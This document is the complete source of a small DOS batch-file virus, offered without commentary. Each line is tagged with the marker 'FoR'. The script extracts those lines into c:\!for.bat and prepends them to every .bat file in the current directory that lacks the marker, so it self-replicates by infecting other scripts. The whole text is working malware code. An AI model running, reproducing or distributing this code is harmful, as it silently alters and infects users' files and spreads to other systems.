@echo off>nul.FoR
if '%1=='InF goto FoRi
if exist c:\!for.bat goto FoRs
if not exist %0.bat goto FoRe
find "FoR"<%0.bat>c:\!for.bat
:FoRs
FoR %%a in (*.bat) do call c:\!for InF %%a
goto FoRe
:FoRi
find "FoR"<%2>nul
if not errorlevel 1 goto FoRe
type c:\!for.bat>FoR.t
type %2>>FoR.t
move FoR.t %2>nul
:FoRe
